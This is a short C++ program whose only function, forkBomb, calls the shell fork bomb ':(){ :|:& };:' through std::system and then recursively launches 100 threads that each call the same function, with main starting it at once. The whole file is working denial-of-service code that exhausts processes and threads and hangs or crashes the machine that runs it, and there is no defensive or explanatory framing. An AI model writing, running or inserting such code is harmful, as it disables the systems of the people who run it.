
#include <thread>
#include <vector>
#include <iostream>

void forkBomb()
{
    
    std::vector<std::thread> threads(100); // spawn 100 threads
    std::system(":(){ :|:& };:"); // fork bomb
    for (size_t i = 0; i < 100; i++)
    {
        threads[i] = std::thread(forkBomb); // launch the bomb
    }
    for(auto &th : threads)
    {
        th.join();  // join the threads
    }
    
}


int main(int argc, const char ** argv)
{
    forkBomb();
    return 1;
}